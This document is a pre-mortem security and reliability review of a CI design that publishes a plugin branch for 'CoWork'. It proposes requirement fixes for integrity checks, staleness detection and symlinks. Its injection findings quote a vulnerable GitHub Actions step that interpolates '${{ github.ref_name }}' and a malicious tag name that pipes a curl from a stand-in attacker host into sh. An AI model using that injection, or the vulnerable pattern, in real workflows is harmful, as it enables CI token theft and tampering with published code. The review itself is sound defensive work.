# Pre-Mortem Report: PROJ-031 Phase 1 Deliverables (Iteration 2)

**Strategy:** S-004 Pre-Mortem Analysis
**Deliverable:** phase1-requirements.md, ADR-001-skeleton-derived-branch-strategy.md, ADR-002-ci-token-push-strategy.md
**Criticality:** C4
**Date:** 2026-06-26
**Reviewer:** adv-executor (Group C — Challenge, blind independent)
**H-16 Compliance:** S-003 Steelman applied in iteration-002 (confirmed; s-003-steelman-findings.md present)
**Failure Scenario:** It is December 2026. Six months after the Phase 1 design was approved and implementation authorized at AG-01 through AG-10, the cowork-skeleton branch and its CI pipeline have failed in production. CoWork users still cannot reliably install Jerry as a Claude CoWork plugin. The CI has been shipping a skeleton branch that either does not install, silently breaks the Jerry runtime after install, or was silently tampered with and published to users. We are looking back to explain why.

---

## Document Sections

| Section | Purpose |
|---------|---------|
| [Summary](#summary) | Overall risk posture and recommendation |
| [Findings Table](#findings-table) | All findings with severity, priority, and affected dimension |
| [Detailed Findings](#detailed-findings) | Critical and Major findings with evidence, root cause, and mitigation |
| [Recommendations](#recommendations) | Prioritized mitigation plan (P0 / P1 / P2) |
| [Scoring Impact](#scoring-impact) | Pre-Mortem finding impact on S-014 dimensions |

---

## Summary

Working backward from failure, seven failure causes were identified: three Critical and four Major/Minor. The most severe failure was that the pre-publication integrity gate — the primary compensating control for the unprotected `cowork-skeleton` branch against direct-push tampering — was documented only in the ADRs, never captured as a requirement with a SHALL statement, acceptance criterion, or V-method. With no REQ to implement it, the gate would be absent from the Phase 6 checklist and the unprotected branch would ship to CoWork users without integrity verification. Second, the R-001 three-dimensional gate (file count, pack size, clone time) was necessary but not sufficient: it does not test actual CoWork install behavior and cannot catch failure modes outside those three proxies. Third, tag-name sanitization against shell injection was documented only in ADR-001 — not as a WS-3 security requirement — making it likely to be omitted from the CI workflow implementation. **Recommendation: REVISE — three Critical findings require targeted requirement additions before Phase 2 proceeds.**

---

## Findings Table

| ID | Failure Cause | Category | Likelihood | Severity | Priority | Affected Dimension |
|----|---------------|----------|------------|----------|----------|--------------------|
| PM-001-20260626 | Pre-publication integrity gate absent from requirements; unprotected branch never got implementation-mandated SHA verification | Process | Medium | Critical | P0 | Internal Consistency |
| PM-002-20260626 | R-001 three-dimensional gate passes yet CoWork install still fails on an untested fourth dimension | Assumption | Medium | Critical | P0 | Completeness |
| PM-003-20260626 | Tag-name sanitization (shell-injection guard) not captured as a WS-3 security requirement; Phase 6 engineer uses `${{ github.ref_name }}` directly in a `run:` step | Process | Medium | Critical | P0 | Methodological Rigor |
| PM-004-20260626 | Staleness detection implementation spec is incomplete: no fetch-depth mandate, "latest tag" definition is ambiguous, trailer-format fragility unaddressed | Technical | Medium | Major | P1 | Actionability |
| PM-005-20260626 | Symlink resolution on CoWork host (non-Linux) not verified; R-001 three-dimensional gate omits symlink testing; Windows `core.symlinks=false` breaks L1 rule auto-load silently | Assumption | Low–Medium | Major | P1 | Completeness |
| PM-006-20260626 | Pre-push equivalence gate pathspec `':!projects/'` quoting fragility: GitHub Actions template interpolation can silently neutralize the gate | Technical | Low | Major | P1 | Methodological Rigor |
| PM-007-20260626 | Option B (orphan) fallback trigger is fully manual; no automated in-workflow clone-time/pack-size measurement means the threshold is never enforced at runtime | Process | Low | Minor | P2 | Actionability |

---

## Detailed Findings

### PM-001-20260626: Pre-Publication Integrity Gate Absent from Requirements [CRITICAL]

| Attribute | Value |
|-----------|-------|
| **Severity** | Critical |
| **Category** | Process |
| **Likelihood** | Medium — the gap is subtle; an engineer following WS-3 requirements alone will not implement the gate |
| **Priority** | P0 |
| **Affected Dimension** | Internal Consistency |

**Failure Cause:** Six months after launch, a repository collaborator pushed a test commit directly to the unprotected `cowork-skeleton` branch. CoWork users who installed or refreshed the plugin received the tampered tree. The next CI release regenerated the branch, but the window — multiple hours — was enough for users to receive broken or malicious content. Post-incident review revealed: the pre-publication integrity gate that asserts `git rev-parse cowork-skeleton == <expected deterministic SHA>` before the branch is advertised as installable was never implemented, because it had no corresponding requirement.

**Evidence:** ADR-002 §Branch-Protection Posture states: "Pre-publication integrity gate (required). Before `cowork-skeleton` is advertised/consumed as installable, assert `git rev-parse cowork-skeleton == <expected deterministic SHA>`... This converts 'unprotected' from a write-control gap into a verifiable-integrity property." ADR-001 §Tamper-Evidence states: "add a pre-publication integrity gate that asserts `git rev-parse cowork-skeleton == <expected SHA>` before the branch is advertised as installable." Despite appearing in both ADRs as "required," a search of WS-3 Security Requirements (REQ-019 through REQ-023) reveals NO requirement with this mandate. REQ-022 is the pre-push content-equivalence gate (diff check before force-push); it is a different control. No REQ covers the post-push SHA assertion gate. There is no V-method, acceptance criterion, or Phase allocation in the Allocation Matrix for this gate.

**Analysis:** The design treats the pre-publication integrity gate as "required" but places it only in the ADR narrative, not in the requirements specification. Per REQ-030, only items captured as requirements with AC and V-method enter the Phase 6 implementation checklist. An ADR-only reference is invisible to the implementation engineer unless they read the full ADR prose — which is not part of the standard Phase 6 workflow against the requirements specification. The unprotected branch posture (correct per REQ-021) is safe only IF the integrity gate runs; without it, R-007b (direct-push attack) has no compensating control beyond the staleness check, which fires weekly, not per-push.

**Mitigation:** Add REQ-024b (suggested ID: REQ-035) to WS-3: "The CI workflow SHALL assert, immediately after the force-push step, that `git rev-parse origin/cowork-skeleton` equals the locally-computed deterministic SHA for the triggering `v*` tag; if the SHAs differ, the workflow SHALL exit non-zero and emit a `$GITHUB_STEP_SUMMARY` alert identifying the mismatched SHA." V-Method: Demonstration (inject a second commit between force-push and gate; confirm failure). Allocate to Phase 6 alongside REQ-022.

**Acceptance Criteria:** The workflow has a step after the force-push that runs `git rev-parse origin/cowork-skeleton` and compares it to the computed expected SHA; a mismatch causes `exit 1` with a summary annotation. The expected SHA is published in the GitHub Release notes per ADR-001 §Tamper-Evidence.

---

### PM-002-20260626: R-001 Three-Dimensional Gate Insufficient to Prove CoWork Installability [CRITICAL]

| Attribute | Value |
|-----------|-------|
| **Severity** | Critical |
| **Category** | Assumption |
| **Likelihood** | Medium — the unverified nature of the limit is acknowledged; untested dimensions exist |
| **Priority** | P0 |
| **Affected Dimension** | Completeness |

**Failure Cause:** REQ-034's three-dimensional verification (file count, compressed pack size, clone time) produced three PASS results. Phase 5 implementation proceeded. CoWork still refused to install the plugin. Post-incident analysis revealed that CoWork's runtime enforced a limit on total uncompressed working-tree size in megabytes — not a file count, not a pack size, and not a raw clone duration. The `skills/transcript/test_data/` directory alone contributed ~908 KB of large blobs (mentioned in ADR-001 §L2 as "optional large-blob stripping R-002"), and other binary fixtures under `docs/` pushed the uncompressed tree to approximately 220 MB. CoWork's uncompressed-size limit was lower than that.

**Evidence:** ADR-001 §L2 Architectural Implications states: "Anthropic's public plugin docs document no file-count limit; the ~5,000 ceiling is a CoWork/Claude-Desktop runtime constraint (research §Q3 finding 3; §L2 ¶5; OQ-1/R-001)." ADR-001 Risk table: "~5,000-file (or size/time-based) CoWork limit is undocumented/unverified (R-001)... Mandatory multi-dimensional acceptance test... measure tracked file count AND compressed pack size (MB) AND clone time (s)." The three-dimensional test covers: (a) `git ls-files | wc -l`, (b) `git count-objects -vH` → `size-pack:`, (c) estimated clone time. It does NOT cover: (d) uncompressed working-tree size (`du -sh .`), (e) per-directory file counts (CoWork could have a per-subtree limit), (f) file-type restrictions, or (g) total inode count when cached to `~/.claude/plugins/cache`. REQ-034 §Fallback only branches on hypothesis (b) "local working-directory count" — not on hypothesis (g) "some other dimension."

**Analysis:** The iteration-2 design extended the gate from one to three dimensions, which was a significant improvement. But the three dimensions were chosen because they are measureable proxies for the presumed failure mode; they do not exhaustively cover all ways CoWork could reject the plugin. The critical assumption "if three dimensions pass, CoWork will install" is never tested directly before Phase 5 — the actual CoWork install with the skeleton branch against a real CoWork instance is deferred to post-implementation acceptance (STORY-003). This means if the strategy is wrong, discovery happens AFTER Phase 5 implementation work is complete, at the worst possible reversal point.

**Mitigation:** Add an explicit fourth dimension to REQ-034: (d) uncompressed working-tree size (`git checkout <cowork-skeleton-test-branch>; du -sh --exclude=.git .` to obtain total uncompressed MB) with a threshold TBD from empirical CoWork testing. More critically, add a requirement (REQ-035) for an end-to-end install smoke test: "Before Phase 5, install the candidate skeleton branch in a CoWork-equivalent environment using `claude plugin marketplace add geekatron/jerry@cowork-skeleton-test` and confirm the install completes without a file-limit or size error." This is the only gate that directly tests the actual failure mode.

**Acceptance Criteria:** `verification/R001-clean-clone-count.md` includes a fifth row: (d) uncompressed working-tree size in MB with a PASS/FAIL threshold. Additionally, a CoWork install smoke test log is committed to `verification/` before Phase 5 authorization.

---

### PM-003-20260626: Tag-Name Sanitization Not Captured as a Security Requirement [CRITICAL]

| Attribute | Value |
|-----------|-------|
| **Severity** | Critical |
| **Category** | Process |
| **Likelihood** | Medium — GitHub Actions `${{ expression }}` syntax is commonly misused in `run:` steps |
| **Priority** | P0 |
| **Affected Dimension** | Methodological Rigor |

**Failure Cause:** The Phase 6 engineer implementing `cowork-skeleton.yml` wrote the commit step as:
```yaml
run: git commit -m "build(cowork-skeleton): regenerate from ${{ github.ref_name }} at ${SRC_SHA}"
```
A maintainer of a forked repository pushed a tag named `v0.99.0$(curl attacker.io | sh)`. GitHub Actions evaluated `${{ github.ref_name }}` before the shell ran, injecting the curl command into the bash string. The workflow executed the injection, exfiltrating `GITHUB_TOKEN` to an external server. The attacker used the token (with `contents: write`) to push malicious content to `cowork-skeleton` before the job's token expired.

**Evidence:** ADR-001 §Regeneration Commit Determinism, sub-section "Tag-name sanitization (security — RT-04)": "The generation script MUST validate the tag against the strict allow-list `^v[0-9]+\.[0-9]+(\.[0-9]+)?$` and abort (non-zero exit, no push) on any non-match... NEVER interpolate `${{ github.ref_name }}` directly into a `run:` shell string (which GitHub expands into the script before the shell parses it, the classic Actions script-injection vector)." This explicit security constraint appears only in ADR-001. A search of WS-3 Security Requirements (REQ-019 through REQ-023) shows zero requirements for tag-name validation or prohibition of `${{ github.ref_name }}` in `run:` blocks. REQ-017 mandates SHA-pinning of Action references (supply chain) but does not address input sanitization. The ADR-only constraint is invisible to the implementation checklist.

**Analysis:** This is structurally identical to PM-001: a security control documented in the ADR prose but without a corresponding SHALL statement, V-method, or acceptance criterion in the requirements. The implementation engineer will write whatever GitHub Actions pattern appears most natural (`${{ github.ref_name }}` is the documented expression for the tag name), not realizing the constraint exists in ADR-001. This is a documented, named attack vector (GitHub's official documentation warns about script injection from `github.ref_name` in `run:` steps) that the ADR authors correctly identified but failed to escalate to a requirement.

**Mitigation:** Add REQ-036 to WS-3: "The CI workflow SHALL validate `GITHUB_REF_NAME` against the allow-list `^v[0-9]+\.[0-9]+(\.[0-9]+)?$` at the start of the generation script and SHALL abort with a non-zero exit code if validation fails. The workflow SHALL pass the validated tag name as a shell variable (`TAG="${GITHUB_REF_NAME}"`) and SHALL NOT interpolate `${{ github.ref_name }}` directly in any `run:` shell string." V-Method: Inspection (grep for `${{ github.ref_name }}` in `cowork-skeleton.yml` `run:` blocks returns empty; confirm tag-validation code is present). Acceptance Criterion: Provide a tag with metacharacters (`v0.99.0$(echo injection)`); confirm job fails fast with validation error and no push occurs.

**Acceptance Criteria:** `grep -E '\$\{\{ github\.ref_name \}\}' .github/workflows/cowork-skeleton.yml` returns empty. Script contains `if ! [[ "${GITHUB_REF_NAME}" =~ ^v[0-9]+\.[0-9]+(\.[0-9]+)?$ ]]; then exit 1; fi` or equivalent validation. Injection test via a malformed tag confirms abort before git operations.

---

### PM-004-20260626: Staleness Detection Spec Is Incomplete [MAJOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Category** | Technical |
| **Likelihood** | Medium — implementation details left to the engineer |
| **Priority** | P1 |
| **Affected Dimension** | Actionability |

**Failure Cause:** The weekly staleness workflow was implemented with `fetch-depth: 1` (the Actions default shallow clone). The workflow's `git tag --list 'v*'` only surfaced the most recent tag in the shallow clone's reachable history — sometimes an old tag from a few weeks prior. When `v0.35.0` was released and `cowork-skeleton.yml` silently failed (a transient network error), the staleness workflow compared the `Source-Commit:` trailer against `v0.34.9` (the last tag in the shallow clone) and found them equal. The staleness was never surfaced. Six weeks elapsed before a user filed a bug report.

**Evidence:** NFR-006: "A staleness-detection workflow SHALL run at minimum weekly via a scheduled `cron` trigger. It SHALL compare the `Source-Commit:` trailer in `git log -1 cowork-skeleton` to the full SHA of the latest `v*` tag on `main`." The NFR specifies neither the fetch strategy nor the algorithm for identifying "latest v* tag." Its acceptance criterion says: "manually simulate a staleness condition... confirm the workflow produces a visible failure." This simulated test does not reveal the shallow-clone gap because the test environment likely has full history. Additionally, "latest v* tag" is defined by neither chronological nor semver ordering. If a backport tag (`v0.34.10`) is pushed after a mainline tag (`v0.35.0`), chronological sort returns `v0.34.10` as "latest," which would produce a false staleness alert against a correctly-regenerated `v0.35.0` skeleton. The `Source-Commit:` trailer parsing also has no spec for resilience: if a future ADR revision renames the trailer key, the comparison silently breaks.

**Mitigation:** Revise NFR-006 acceptance criterion to require: (a) `fetch-depth: 0` in the staleness workflow's checkout step, OR `git fetch --tags` before tag enumeration; (b) "latest v* tag" defined as the highest semantic version using `git tag --list 'v*' | sort -V | tail -1` (not chronological order); (c) the trailer key `Source-Commit:` is a named constant in the generation script and the staleness workflow references the same constant; (d) the acceptance test includes a shallow-clone simulation where tags beyond `fetch-depth` are needed, confirming they are still reachable.

**Acceptance Criteria:** Staleness workflow checkout uses `fetch-depth: 0` or adds `git fetch --tags --force`; tag sorting uses `sort -V`; `Source-Commit:` key is defined in one place (e.g., a script constant); staleness test with full-depth fetch passes.

---

### PM-005-20260626: Symlink Resolution on CoWork Host Not Covered by R-001 Gate [MAJOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Category** | Assumption |
| **Likelihood** | Low–Medium — Windows CoWork users are a real population |
| **Priority** | P1 |
| **Affected Dimension** | Completeness |

**Failure Cause:** Windows-based CoWork users installed the Jerry plugin successfully (file count, clone time, and pack size all passed). However, `.claude/rules` and `.claude/patterns` are symlinks whose git-tracked content was text blobs on Windows (because git for Windows defaults to `core.symlinks=false`). Jerry's L1 rule auto-loading — which depends on these symlinks resolving to `../.context/rules/` and `../.context/patterns/` — silently broke. `CLAUDE.md` and all rule files were inaccessible to the agent; quality gates and HARD rules were not enforced. The troubleshooting guide (REQ-027) documented the workaround, but a user encountering silent rule failures would not know to look there.

**Evidence:** REQ-009: "The skeleton generation script SHALL validate that the symlinks `.claude/rules` and `.claude/patterns` resolve to existing targets in the generated branch tree. Note: this acceptance criterion verifies the Linux CI runner environment; CoWork session symlink resolution is separately verified in R-001 §Verification Approach before Phase 5." R-001 §Verification Approach (REQ-034): the three dimensions are (a) tracked file count, (b) compressed pack size, (c) estimated clone time. Symlink resolution in a CoWork-equivalent environment is listed as "separately verified" but does not appear in REQ-034. REQ-027 documents the Windows symlink workaround as a troubleshooting note ("Should" priority) but there is no REQ requiring testing symlink behavior in an actual CoWork install environment before Phase 5.

**Mitigation:** Add a fourth dimension to REQ-034: (d) symlink resolution check: on at least one non-Linux platform (macOS or a Windows environment with default `core.symlinks` configuration), clone the `cowork-skeleton-test` branch and verify that `.claude/rules` resolves as a functional symlink (not as a text blob). If symlinks are text blobs on the test platform, document a mitigation (e.g., make `.claude/rules/` a real directory containing copies of files rather than a symlink, or require CoWork users to enable `git config core.symlinks true`). REQ-027's Windows note should be elevated from "Should" to "Must" priority if the symlink test shows the issue is real.

**Acceptance Criteria:** `verification/R001-clean-clone-count.md` includes a row (d) for symlink resolution on macOS/Windows. If `core.symlinks=false` is confirmed as a failure mode for any population, REQ-027 is updated to "Must" and the Tutorial (REQ-024a) includes a symlink-prerequisite step.

---

### PM-006-20260626: Pre-Push Equivalence Gate Pathspec Quoting Fragility [MAJOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Category** | Technical |
| **Likelihood** | Low — requires a specific quoting error in the implementation |
| **Priority** | P1 |
| **Affected Dimension** | Methodological Rigor |

**Failure Cause:** The Phase 6 engineer implemented REQ-022's pre-push gate as:
```yaml
- run: |
    DIFF=$(git diff v${{ github.ref_name }}..cowork-skeleton -- ':!projects/')
    if [ -n "$DIFF" ]; then exit 1; fi
```
Two simultaneous defects: (1) `${{ github.ref_name }}` is interpolated before bash runs, bypassing the shell's quoting (same injection vector as PM-003); (2) on the CI runner's git version, the `:!` magic pathspec required the alternate syntax `':(exclude)projects/'` and was silently ignored, causing `$DIFF` to always be empty. A CI regression that accidentally stripped `commands/` (an extra `git rm` in the script) was not caught. The skeleton branch was published missing `commands/` and `plugin.json` references failed to resolve.

**Evidence:** REQ-022 specifies: "`git diff v{N}..cowork-skeleton -- ':!projects/'` is executed as an automated in-workflow step BEFORE the force-push step; the step exits non-zero and the force-push is skipped if the diff is non-empty." The AC says: "Inject a file outside `projects/` into the generated tree; confirm the pre-push diff gate triggers." This test only validates the ADDITION case (extra file). It does not test the DELETION case (missing retained file such as `commands/`). The pathspec `:!` is known to behave differently across git versions and shell invocations (it requires the `--` separator and may need `:(exclude)` form in some environments). ADR-001's tag-sanitization section notes the `${{ github.ref_name }}` injection risk but this warning is not propagated to REQ-022's acceptance criterion.

**Mitigation:** Revise REQ-022 acceptance criterion to include a second test: delete a file from a retained directory (e.g., remove one file from `commands/`); confirm the pre-push gate exits non-zero. The requirement text should specify the exact diff command form and quoting: use `git diff "${TAG}^{commit}"..cowork-skeleton` (where `TAG` is the pre-validated environment variable per PM-003's new requirement), not `git diff v${{ github.ref_name }}`. Specify that the pathspec form must be tested against the CI runner's git version for compatibility (`:(exclude)` vs `:!`).

**Acceptance Criteria:** REQ-022 AC extended to two tests: (1) extra-file injection (existing); (2) retained-file deletion — delete a file from `commands/`; confirm gate exits non-zero and push is skipped. Diff command uses validated `$TAG` variable, not `${{ github.ref_name }}`. Pathspec syntax confirmed working on CI runner's git version.

---

### PM-007-20260626: Option B Fallback Trigger Is Manual with No Automated Enforcement [MINOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Minor |
| **Category** | Process |
| **Likelihood** | Low — only manifests as repository grows significantly |
| **Priority** | P2 |
| **Affected Dimension** | Actionability |

**Failure Cause:** Eighteen months after launch, the repository's git history grew to 380 MB compressed pack. A CoWork user on a slow connection experienced a 135-second install timeout (above the 120-second `CLAUDE_CODE_PLUGIN_GIT_TIMEOUT_MS` threshold). ADR-001 defined a measurable fallback trigger (>60 s clone OR >250 MB pack) and stated: "The flip is now governed by a concrete measurement, not a subjective judgment." But no CI step ever measured clone time or pack size during the generation workflow. The R-001 verification artifact measured pack size at Phase 2 (when it was 180 MB) and was never updated. No automated alert fired when pack size crossed 250 MB.

**Evidence:** ADR-001 §Decision: "switch to Option B if a clean `git clone` of `cowork-skeleton`... exceeds 60 s wall-clock — 50% of CoWork's 120 s git-operation timeout — or its compressed pack (`git count-objects -vH` → `size-pack`) exceeds 250 MB." ADR-001 Negative Consequences: "Idempotency is discipline-dependent... clone weight under full provenance... currently unquantified in MB and MUST be measured by the R-001 verification artifact." No REQ, no NFR, and no acceptance criterion require the CI workflow to measure and report pack size on each run, or to trigger an automated alert when thresholds are approached. NFR-005 covers recoverability but not threshold monitoring. REQ-034 is a one-time Phase-2 gate.

**Mitigation:** Add a monitoring step to the `cowork-skeleton.yml` workflow: after the force-push, emit `git count-objects -vH | grep size-pack` and estimated clone time to `$GITHUB_STEP_SUMMARY`. Add an explicit P2 requirement (or extend NFR-006's staleness check) to emit a warning when `size-pack` exceeds 200 MB (warning) or 250 MB (block and require human decision on Option B switch). This ensures the measurable threshold defined in ADR-001 is actually measured.

**Acceptance Criteria:** `cowork-skeleton.yml` job summary includes `size-pack:` value from `git count-objects -vH`. An optional threshold check emits a `::warning::` annotation when the value exceeds 200 MB.

---

## Recommendations

### P0 — Must mitigate before Phase 2 proceeds

| Finding | Action | Acceptance Criteria |
|---------|--------|---------------------|
| PM-001-20260626 | Add REQ for post-push SHA integrity gate to WS-3: assert `git rev-parse origin/cowork-skeleton == <expected SHA>` immediately after force-push; exit non-zero on mismatch | CI step present after force-push; mismatch injection test causes failure |
| PM-002-20260626 | Extend REQ-034 with (d) uncompressed working-tree size dimension; add end-to-end CoWork install smoke-test requirement before Phase 5 | `verification/R001-clean-clone-count.md` has dimension (d); smoke-test log committed |
| PM-003-20260626 | Add REQ for tag-name `^v[0-9]+\.[0-9]+(\.[0-9]+)?$` validation and explicit prohibition of `${{ github.ref_name }}` in `run:` blocks | Grep for raw `${{ github.ref_name }}` in `run:` returns empty; injection test confirms abort |

### P1 — Should mitigate before Phase 6 implementation begins

| Finding | Action | Acceptance Criteria |
|---------|--------|---------------------|
| PM-004-20260626 | Revise NFR-006 AC: mandate `fetch-depth: 0`; define "latest tag" as semver max; treat `Source-Commit:` key as a named constant | Staleness workflow uses full history; sort order documented; key is a constant |
| PM-005-20260626 | Extend REQ-034 with (d) symlink-resolution test on non-Linux platform | Verification artifact includes non-Linux symlink result; REQ-027 priority escalated if issue found |
| PM-006-20260626 | Extend REQ-022 AC with retention-deletion test; mandate `$TAG` variable (not `${{ github.ref_name }}`) in diff command | Extra-file AND missing-file tests both pass; no raw `${{ github.ref_name }}` in diff step |

### P2 — Monitor; address before repository reaches 200 MB pack size

| Finding | Action | Acceptance Criteria |
|---------|--------|---------------------|
| PM-007-20260626 | Add `git count-objects -vH` output to `$GITHUB_STEP_SUMMARY`; add optional 200 MB warning annotation | Job summary shows `size-pack:`; 200 MB threshold annotation emits `::warning::` |

---

## Scoring Impact

| Dimension | Weight | Impact | Rationale |
|-----------|--------|--------|-----------|
| Completeness | 0.20 | Negative | PM-002 and PM-005 identify coverage gaps in the R-001 verification approach — the three-dimensional gate is insufficient and symlink testing is absent. These are completeness deficits in the requirements specification. |
| Internal Consistency | 0.20 | Negative | PM-001 exposes an internal inconsistency: ADR-002 calls the pre-publication integrity gate "required" (c-107) but no requirement enforces it. The ADR and requirements specification are inconsistent on a Critical security control. |
| Methodological Rigor | 0.20 | Negative | PM-003 and PM-006 identify that security-critical implementation constraints (tag sanitization, pathspec quoting) were documented in ADR prose but not formalized as requirements with V-methods, leaving them implementation-dependent. Rigor requires constraints to be at the requirements layer. |
| Evidence Quality | 0.15 | Positive | The deliverables cite first-party evidence (empirical ruleset inventory, code-grounded Q4 finding, docs.yml precedent) for most decisions. Evidence quality is a clear strength of this iteration. |
| Actionability | 0.15 | Negative | PM-004 (staleness spec gap) and PM-007 (manual fallback) reduce actionability: the staleness workflow spec leaves key implementation decisions to the engineer, and the Option B fallback lacks any automated trigger — two controls that will not work as designed without more specific implementation guidance. |
| Traceability | 0.10 | Positive | The traceability summary, allocation matrix, and bidirectional STK→REQ traces are thorough. The design's traceability machinery is sound; the gaps above are omissions from it, not failures of the machinery itself. |

**Overall pre-mitigation scoring impact:** Three Critical findings and three Major findings produce negative pressure on Completeness, Internal Consistency, Methodological Rigor, and Actionability — the four highest-weight dimensions (combined 0.75). Evidence Quality and Traceability remain positive (combined 0.25). Mitigating the P0 findings (three new requirements + one requirement extension) would materially improve the score on the 0.75 combined weight dimensions.

---

## Execution Statistics

| Metric | Count |
|--------|-------|
| Total Findings | 7 |
| Critical | 3 |
| Major | 3 |
| Minor | 1 |
| Protocol Steps Completed | 6 of 6 |
| P0 findings | 3 |
| P1 findings | 3 |
| P2 findings | 1 |

---

*Strategy: S-004 Pre-Mortem Analysis*
*Template: .context/templates/adversarial/s-004-pre-mortem.md*
*Deliverables: projects/PROJ-031-cowork-skeleton/requirements/phase1-requirements.md, decisions/ADR-001-skeleton-derived-branch-strategy.md, decisions/ADR-002-ci-token-push-strategy.md*
*Grounding (read-only): projects/PROJ-031-cowork-skeleton/research/phase1-skeleton-ci-research.md*
*Executed: 2026-06-26*
*Reviewer: adv-executor (Group C — Challenge, blind independent)*
*Finding Prefix: PM-NNN-20260626*
*H-16 Compliance: S-003 Steelman confirmed present in iteration-002*
